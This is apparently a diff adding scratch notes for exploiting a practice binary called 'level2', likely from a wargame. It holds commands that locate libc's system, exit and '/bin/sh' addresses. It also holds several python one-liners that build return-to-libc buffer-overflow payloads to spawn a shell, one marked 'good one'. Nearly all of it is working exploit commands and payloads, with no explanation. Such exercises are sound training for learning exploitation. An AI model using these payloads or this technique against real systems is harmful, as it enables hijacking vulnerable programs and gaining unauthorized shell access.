@@ -1,0 +1,24 @@
+readelf -sW ./level2
+ldd ./level2
+xxd /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
+gdb -> info proc mapping
+printf '0x%X\n' $((0xb7e2c000 + 0x0160c50 + 0x50)) // /bin/sh 0xb7f8cca4
+
+readelf -sW /lib/i386-linux-gnu/libc.so.6 | grep exit
+readelf -sW /lib/i386-linux-gnu/libc.so.6 | grep system
+printf '0x%X\n' $((0xb7e2c000 + 0003f060)) //system 0xb7e6b060
+printf '0x%X\n' $((0xb7e2c000 + 00032be0)) //exit 0xB7E5EBE0
+
+python -c 'import struct; import sys; sys.stdout.write("a"*72 + struct.pack("<I", 0x123456))'
+
+python -c 'import struct; import sys; sys.stdout.write("a"*76 + struct.pack("<I", 0xb7e6b060) + struct.pack("<I", 0x0804853e) + struct.pack("<I", 0xb7e5ebe0) + struct.pack("<I", 0xb7f8cca4)))' > /tmp/inject ; ./level2 < /tmp/inject
+
+python -c 'import struct; import sys; sys.stdout.write("a"*76 + struct.pack("<I", 0xb7e5ebe0) + struct.pack("<I", 0x0804853e) + struct.pack("<I", 0xb7e6b060) + struct.pack("<I", 0xb7f8cc58))' > /tmp/inject ; ./level2 < /tmp/inject
+
+python -c 'import struct; import sys; sys.stdout.write("a"*76 + "BBBB" + struct.pack("<I", 0x0804853e) + struct.pack("<I", 0xb7e6b060) + struct.pack("<I", 0xb7e5ebe0) + struct.pack("<I", 0xb7f8cc58))' > /tmp/inject ; ./level2 < /tmp/inject # good one
+
+
+gdb
+  info proc mapping
+  layout reg
+  
